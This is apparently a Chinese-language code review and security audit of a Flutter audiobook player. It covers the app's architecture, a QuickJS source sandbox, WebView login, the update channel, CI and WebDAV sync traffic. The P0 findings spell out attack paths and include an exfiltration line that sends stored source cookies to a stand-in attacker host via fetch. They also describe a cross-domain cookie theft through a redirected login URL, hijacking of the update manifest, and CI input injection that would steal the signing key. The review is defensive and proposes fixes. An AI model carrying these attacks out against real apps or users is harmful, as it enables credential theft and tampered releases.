## 1. 项目定位与技术栈

一个 Android 优先的**有声书聚合播放器**。核心思路是「一套 QuickJS 音源协议适配任意站点」+「四个内置网盘当书库」+「WebDAV 加密多设备同步」+「邀请码云控授权」。

| 维度 | 现状 |
| --- | --- |
| UI | 纯 Flutter / Material 3，无路由库（`Navigator.push` 直传），无状态管理框架（单例 Service + `ChangeNotifier`/`ValueNotifier` + `setState`） |
| 音频 | `just_audio` 0.10.6 + `audio_service` 0.18.19（后台/通知栏/锁屏） |
| 扩展性核心 | `flutter_js` 0.8.7（QuickJS）执行用户 JS 音源 |
| 持久化 | `sqflite`（`tingshu.db`，v9）+ `shared_preferences` + `flutter_secure_storage`（Keystore） |
| 网络 | `dio`（散落 10+ 处各自 `Dio()` 实例，仅两处配了完整超时） |
| 密码学 | `pointycastle`（音源 AES/SM4/XChaCha 桥 + 同步信封 AES-256-CBC + HMAC） |
| 服务端 | `cloud-control/`：Cloudflare Worker + D1 + R2（邀请码/设备绑定/私有音源下发） |
| 原生 | 3 个 Kotlin 文件、7 条 MethodChannel、2 个 WebView（登录、嗅探） |

## 2. 各层剖析

### 2.1 启动与全局结构（`lib/main.dart`）

首帧前只做关键路径：`AudioService.init` → `PlayerService.attachHandler`（40-52）→ `SettingsService.init`（54）→ `getDb()`（60）→ `CloudAuthService.init`（66）→ `SourceManager.init`（81）→ `runApp`（88）；首帧后 `_initDeferredServices`（93-141）依次初始化收听统计、四个网盘、WebDAV 同步、追更服务。每步独立 `try/catch`，**单个模块失败不阻塞启动**——这是本仓库做得较好的一处工程决策。

代价有两点：

- `SettingsService.init` 失败被静默吞掉（main.dart:56-58），`CacheService` 会永久按默认 `autoCache=false` 运行且不重试。
- `ListeningStatsService.addPlayedSeconds` 没有 `_ready` 守卫（`lib/data/listening_stats_service.dart:35-46`），而它由播放器直接调用（`lib/player/player_service.dart:821`）；若在首帧后初始化完成前就开始播放，`_persist` 会以 `0+Δ` **覆盖历史累计时长**（同文件 64-69）。★

`HomeShell`（main.dart:174-229）用 `IndexedStack` 让四页常驻；`TingshuApp` 用 `AnimatedBuilder(merge([Settings, Theme]))` 包住**整个 MaterialApp**（148-169）——任意设置变化重建全树。

### 2.2 音源域（本项目最核心、也是最大风险面）

**协议**：JS 对象表达式，必须实现 `search/getChapters/getAudioUrl`，可选 `discover`。

**执行链路**：
`SourceManager.call` → `JsEngine.call`（`lib/source/js_engine.dart:280-308`，固定 30s 超时）→ `evaluate('__call(...)')` → `assets/js/uni_shim.js:243-259` 用 `Promise.resolve().then()` 把方法体推迟到微任务 → Dart 侧 `Timer.periodic(50ms)` 泵 `executePendingJob()`（js_engine.dart:132-145）→ 音源内 `uni.request` 走 `sendMessage('http')`（uni_shim.js:35-48）→ Dart `_doHttp` 用 dio 发请求（js_engine.dart:165-225）→ 回程 `__httpResolve(id, env)`。

**做得对的**：
- 契约层 `SourceContract` 严格校验必填字段、apiVersion、音频 URL 必须 http/https、分页归一、页内去重（`lib/source/source_contract.dart`）。
- 外联审计只记 `scheme://host/path`，剥掉 query，避免 token 进日志（js_engine.dart:174、227-232）。
- 通用加密下沉到 Dart（`lib/source/source_crypto.dart`：AES-CBC/XChaCha20-Poly1305/AES-GCM/SM4/摘要），音源不必自带密码学实现；AES 密钥/IV 长度都做了校验。

**关键短板（详见 §3 P0-1）**：所有音源共用**一个 QuickJS 全局作用域**，`__sourceConfigs` 全局可读 → 一个音源能直接读走另一个音源的 Cookie；`sendMessage` 是 JS 全局 → 可伪造任意 `reqId` 的 `result`；`flutter_js` 的 `getJavascriptRuntime()` **默认开启 fetch/XHR**，绕过 `uni.request` 的审计通道；引擎无执行时限与内存上限。

**文档与实现对不上的地方**：仓库自带 skill `.claude/skills/tingshu-source-writer/SKILL.md:25` 明确写「是 QuickJS，不是浏览器：没有 `fetch / XMLHttpRequest`」——**运行时其实有**（见 §3 P0-1 的证据链）。写源者与审计者都被这句话误导。

### 2.3 播放器域（`lib/player/`）

`PlayerService` 是播放状态的唯一所有者，页面/MiniPlayer/AudioHandler 都不直接碰 `AudioPlayer`。设计上值得肯定的部分：

- `playIndex` 用 `_playSeq` 递增序号 + 每次 `await` 后复核（player_service.dart:475、491、777-788），方向正确。
- 本地缓存优先、失败删缓存回退网络（573-649）；网络加载时重新解析动态直链，避免复用过期签名。
- 播放流中断自动恢复有限次（125-192，最多 2 次、700ms 退避、20s 稳定后清零）。
- 定时关闭按集/按分钟，按分钟支持 10s 音量淡出。

不足见 §3 P1-8（6 处守卫静默 `return`、`_ensurePlayerConfig` 无 `try`、待续播态丢失、恢复失败无 UI 出口、淡出期间切集被静音）。

### 2.4 数据与缓存（`lib/data/`）

- **缓存**：普通音频 `.tmp` → 校验（2xx、512 字节 magic、拒 HTML/JSON/403 页、`#extm3u` 转 HLS）→ 改名为正式文件 → 写 `cache_files`；HLS 解析主列表、下钻 ≤3 层、优先纯音频轨、拒 `BYTERANGE` 与无 `ENDLIST` 列表、改写 URI 为本地相对路径（`lib/data/cache_service.dart:956-1037、1182-1237`）。
- **清理**：`cleanupLimit`（集数）+ `cacheSpaceLimit`（空间）双上限，按 `cachedAt ASC` 删。
- **目录**：分页写 `catalog_books/catalog_chapters`，`offset+limit` 窗口查询已具备（`lib/data/catalog_cache_service.dart:183-200`），但**调用点仍在用整本 `load`**。
- **凭据分级**：`SecureStore`（`sec.` 前缀，Keystore 加密）承载网盘账号/Cookie、同步密码、云控令牌；旧明文键 `readMigrated` 迁移。这是明确的安全进步；残留问题是**音源自身的 Cookie 仍随 `audio_sources` 明文存 SharedPreferences**（`lib/source/source_manager.dart:229-237`，已知边界，架构文档也承认）。
- **同步加密**：`SyncCrypto` 用 **PBKDF2-HMAC-SHA256（5 万次）→ 64B → AES-256-CBC + HMAC-SHA256，Encrypt-then-MAC，恒定时间比较，每次随机 16B 盐 + 16B IV**（`lib/data/webdav_sync_service.dart:740-843`）。★ 这部分设计是正确且干净的。

问题集中在：`cache_files` 主键缺 `bookId`、清理无播放保护、四网盘 `Dio()` 无超时、同步的时间戳/墓碑语义（§3 P1）。

### 2.5 网盘（WebDAV / AList / 百度 / 夸克）

四者结构高度相似（各自 589-742 行），总重复代码估算 **≈926 行 / 34.6%**（DTO、账号生命周期、路径作用域、命名/排序工具、封面缓存流水线、分页循环）。差异点是真实存在的（path vs fid、4 种直链返回形态、3 种分页语义、4 类鉴权头、4 类错误模型），所以不能简单合并——但「只有百度/夸克识别 429」「只有夸克处理 412」这类不一致，正是重复实现没被统一抽象的后果。

### 2.6 云控服务端（`cloud-control/`）

D1（users/invites/devices/sessions/request_nonces/cloud_settings/audit_logs）+ R2（`control/config.json`、`sources/*.js`）+ ASSETS（管理后台静态页）。值得肯定的部分：

- 设备身份是 **AndroidKeyStore 里的 EC P-256 密钥**，`deviceId = sha256(SPKI)`（`MainActivity.kt:172-233`），请求签名 `METHOD\npath?query\ntimestamp\nnonce\nsha256(body)` + ±5 分钟时间窗 + `request_nonces` 全局防重放（`src/utils.ts:299-341`、`src/auth.ts:74-133`）。
- 邀请码服务端只存 `code_hash` 用于校验，消费用条件 `UPDATE ... RETURNING` 防并发超发（`src/app-routes.ts:179-188`）。
- 管理后台：HMAC 签名 Cookie（HttpOnly/Secure/SameSite=Strict）+ CSRF 头 + 失败 5 次锁 15 分钟 + 严格 CSP + 前端全量 `escapeHtml`。

缺陷见 §3 P0-6 / P1-12（邀请码明文列、Access 头信任、每请求多次 D1 写）。

### 2.7 Android 原生桥

7 条通道：`source_file_picker`、`source_login`、`audio_sniffer`、`app_update`、`background_protection`、`device_identity`、`update_notify`。FileProvider 只授权 `<cache-path path="."/>`（`file_paths.xml:3`）与 `app_update_service.dart:226-231` 精确匹配，**没有 root-path 越权**；更新包有 SHA256 校验。这两点做对了。

问题集中在 WebView 配置与全局明文（§3 P0-2、P0-3）。

### P0-1 ★ 音源不是沙箱：跨源凭据读取、结果伪造、旁路外联、可冻结进程

**证据链**

1. 音源用 `new Function('uni', 'return (\n' + code + '\n)')(uni)` 在**全局作用域**编译（`assets/js/uni_shim.js:211`），所有音源共享 `__sources/__sourceConfigs/__store/__httpCbs`（同文件 5-11、200-207），整个进程只创建一个 runtime（`lib/source/js_engine.dart:43、52`）。
   → 音源 A 可读 `__sourceConfigs['源B'].cookie`，也可替换 `__sources['源B'].search` 劫持其返回。
2. `sendMessage` 是 flutter_js 注入的 JS 全局，`_handleResult` 只按自增 `reqId` 索引，**不校验来源**（js_engine.dart:19、235-245、287-289）。
   → 恶意源可在多源并发（发现页 `Future.wait` 无并发上限）时 `sendMessage('result', {reqId, ok:true, data:{...}})` 伪造另一源的书单/章节/音频 URL。
3. `flutter_js` 的 `getJavascriptRuntime()` 默认 `xhr = true` → 无条件 `runtime.enableFetch()`（pub-cache `flutter_js-0.8.7/lib/flutter_js.dart:47`、29），XHR 扩展用 `package:http` 直接发请求（`.../lib/extensions/xhr.dart:258-345`）。
   → `fetch('http://attacker/', {body: JSON.stringify(__sourceConfigs)})` 可外带凭据，且**完全不走 `SourceNet` 审计**（审计只挂在 `uni.request` 上，js_engine.dart:210-215）。
4. 同一 XHR 扩展把远端响应体拼进 JS 模板字符串：`"…callback($responseInfo, \`$responseText\`, $error);"`（xhr.dart:341-343）★ → 响应内容含反引号/`${}` 时可越界成代码执行。
5. 引擎既无执行时限也无内存上限：`QuickJsRuntime2(stackSize: stackSize)` 未传 `timeout`/`memoryLimit`（flutter_js.dart:33-37），`evaluate` 是**同 isolate 同步 FFI**。
   → 音源里一行 `while(true){}` 即冻结 UI（仓库自带的 ANR dump 经核查是模拟器输入派发超时、主线程空闲，**不能**作为此类故障的既发证据，但风险可达）。

**修法建议（按性价比）**
1. 初始化改成显式 `QuickJsRuntime2(stackSize: …, timeout: 3000, memoryLimit: 32<<20)`，并去掉/禁用 `enableFetch()`；同时把 XHR 回程改成 `jsonEncode` 传参而非模板字符串。
2. 一源一 context；做不到就把 shim 的 `__*` 收进闭包并 `Object.freeze`，`_handleResult` 增加 `sourceId` 归属校验（shim 里已有 `sourceId` 字段，只是没用）。
3. `__currentCallSourceId` 是全局共享并被 `getStorageSync` 用来取配置（uni_shim.js:11、156-163、250-259）：A 源在途时 B 源启动，A 的续延会读到 B 的 cookie（跨源串号）。应改为随调用上下文显式传递。

`android/app/src/main/AndroidManifest.xml:16` `android:usesCleartextTraffic="true"`；配合播放器接受 `http://` 音频（`lib/player/player_service.dart:655、671-692`）与封面（`lib/widgets/cover_image.dart:73-75`）。

### P0-3 ★ 登录 WebView 把两域 Cookie 合并回传，并全面放宽 WebView 策略

`LoginWebViewActivity.kt`
- `collectCookies()` 取 **currentUrl 与 initialUrl 两个域**的 Cookie 合并成一个串回传（186-199，`deliverResult` 173-184）。
- `setAcceptThirdPartyCookies(true)`（85）、`setJavaScriptEnabled/domStorage/database` 全开（87-89）、`mixedContentMode` 恒 `ALWAYS_ALLOW`（90）、`shouldOverrideUrlLoading` 恒 `false`（95-102，任意 scheme/重定向都留在 WebView 内）。
- 登录入口 URL 来自**远端音源元数据**（`lib/screens/source_manage_screen.dart:238-246`）。

→ 音源作者只需填一个会 302 到自己域名的 `loginUrl`，就能让用户登录后把**其他域（含网盘账号域）的会话 Cookie** 一并带走。加上嗅探会话同样 `ALWAYS_ALLOW` 且把页面域 Cookie 合并发给音频域（`AudioSnifferSession.kt:75、258-284`），这构成一条完整的凭据越界路径。
**修法**：只回传 `initialUrl` 单域 Cookie；白名单化 `loginUrl` 域名；`mixedContentMode = NEVER_ALLOW`。

### P0-4 ★ 应用更新链路可被第三方加速代理劫持

`lib/data/app_update_service.dart:57-64` 内置 6 个 GitHub 加速代理；清单本身也按代理优先顺序请求（233-250、288-295），而校验 APK 的 SHA256 **正是取自这份被代理的清单**（102、120、178-182）。
→ 任一代理解析不出 GitHub 也能自造 `version.json`（自带 sha256 与 APK 地址）并投放篡改包，客户端校验必然通过。发布权实际外放给了 6 个第三方。
**修法**：清单只允许从固定 HTTPS 源直取；或对清单做 Ed25519 签名、公钥固化在 App 内，代理仅用于 APK 字节。

### P0-5 ★ CI 可被输入注入提权，且发布流程不跑测试

`.github/workflows/release-apk.yml`
- `workflow_dispatch` 的自由文本输入被 `${{ }}` **直接插进 `run:` 脚本体**（75-76、86、168、186、193），同一 job 内持有签名 keystore + 口令（46-65）与发布仓库 PAT（151、173）。
  → 有仓库写权限、但无 secret 读取权的协作者，在 `version_name`/`changelog` 填命令替换即可拿到 Android 签名私钥与 PAT。
- 门禁只有 `flutter analyze lib test`（44 行），**全流程没有 `flutter test`**；`cloud-control/package.json` 也无 test 脚本。
- 签名材料明文落 workspace 无清理（59-65）；`git commit || echo`（168）掩盖失败；无 `concurrency` 保护；action 用可变 tag 而非 SHA；PAT 拼进 clone URL（161）。

**修法**：输入经 `env:` 中转 + 正则白名单；加 `flutter test`；细粒度 token（仅发布仓 contents:write）；`persist-credentials:false`；签名步骤后立即删文件；加 `concurrency: group: release`。

## 6. 附录：WebDAV 同步的流量核算

**结论：偏大，而且主要浪费在"没变化也照传"上。** 三个机制叠加。

### 6.1 每次同步**必然**上传整包（核心放大项）★

`_buildPayload()` 每次调用都把 `updatedAt` 写成当前毫秒（`webdav_sync_service.dart:663`），而"是否要上传"的判据是整包规范化 JSON 的比较（484-489）：

```dart
final merged = await _buildPayload();
if (remote == null || _sortedJson(merged) != _sortedJson(remote)) { ... putString ... }
else { _lastResult = '云端与本地一致'; }          // ← 这一支数学上不可达
```

`updatedAt` 必然与云端不同 ⇒ **永远进 PUT 分支**，`'云端与本地一致'` 是死分支。即使一个字节都没改，一轮同步也是「整包 GET + 整包 PUT」。

### 6.2 载荷体积：音源代码全文 + 最多 800 条进度（含封面 URL），且不可压缩

| 组成 | 证据 | 体积特征 |
| --- | --- | --- |
| `sources` | `source_manager.dart:242` 直接把 `_stored` 整条导出，条目内 `code` 是**音源 JS 全文** | 仓库 45 个音源合计 533KB，单个最大 162KB；典型源 2.4-27KB（平均 8.7KB） |
| `progress` | `progress_service.dart:104` `limit: 800`，字段含 `cover`（签名 CDN URL，**每条 100-300 字符**） | 最坏 800 × ~350B ≈ 280KB |
| `shelf` | `webdav_sync_service.dart:669-681`，含 `cover` | 约 300B/本 |
| 信封 | `SyncCrypto.encrypt` → JSON 里放 base64（`webdav_sync_service.dart:803-810`） | 密文 base64 固定 **×1.34**；AES 密文**不可压缩**，所以 HTTP 层再压也没用（何况 PUT 也没开 gzip） |

### 6.3 触发频率：启动无条件一轮 + 播放中每 5 分钟一轮

- 启动 10 秒后**不看是否有变更**直接 `syncNow(reason:'startup')`（382-385）→ 每次冷启动至少一轮 GET+PUT。
- 播放中进度每 5 秒落库（`player_service.dart:790`、`progress_service.dart:24`）⇒ `_hasLocalChanges()` 恒为 true ⇒ 走 `onlyProgress` 分支、最小间隔 5 分钟（419-433）→ **收听期间每 5 分钟一整包往返**。
- 书架/设置有变更时最小间隔 90 秒（247、429）。
- 空闲且无变更时不传（421 行拦截）——这一层门是有效的。

### 6.4 量级估算（明文按 UTF-8 计，信封 = ceil(P/16)×16×4/3 + 130B）

| 场景 | 明文 | 信封（文件大小） | 一轮 GET+PUT | 连续听书 3 小时 |
| --- | --- | --- | --- | --- |
| 轻度：5 源 ×9KB、50 书架、50 进度 | 79 KB | **105 KB** | ~211 KB | ~7.5 MB（36 轮） |
| 中度：10 源 ×9KB、150 书架、200 进度 | 206 KB | **275 KB** | ~549 KB | ~20 MB |
| 重度：15 源 + 1 个 162KB 大源、200 书架、800 进度 | 631 KB | **841 KB** | ~1.7 MB | ~60 MB |

再加每次冷启动一轮。**如果服务端是国内 NAS/自建 WebDAV，这就是手机上行流量**，重度用户一天几十 MB 起步。

### 6.5 优化杠杆（按性价比）

1. **让"无变化不上传"真正生效**：把 `updatedAt`（和 `deviceTag`）从比较口径里剔除，或改成独立的 `revision` 计数器 / `If-Match` + ETag。仅此一项即可让纯收听场景从"每 5 分钟整包"降到"真正改动才传"。
2. **进度条目去掉 `cover`**：封面可由各端按 `(sourceId,bookId)` 本地重建，这一项就占进度块 30-50%。
3. **`sources` 不同步 `code`**：只同步 `id/enabled/顺序/config/订阅地址`，JS 代码各端按订阅 URL 自己拉。重度场景里这一项是大头（162KB 单源直接消失）。
4. **启动同步加 `_hasLocalChanges()` 判断**；进度上传改为"切章/暂停/退出播放时"触发，而不是固定 5 分钟。
5. **改二进制 PUT + 明文先 gzip**：去掉 base64 直接省 25%（×1.34 → ×1.0），明文 gzip 对 JS 代码通常压 3-5×，组合后单轮可降 4-6 倍。
6. 长期：按 `(sourceId,bookId)` 分片或按设备分文件 + 服务端合并，彻底摆脱"整包往返"。

**自测方法**：看 WebDAV 服务端 `{remoteDir}/juting_sync.json` 的大小，乘以"每日同步轮数"即实际流量；App 侧可在运行日志里按 `Sync` 类目数「WebDAV 同步完成」条数得到轮数。

### 6.6 已实施（第 1 批，2026-09）

| 改动 | 位置 | 效果 |
| --- | --- | --- |
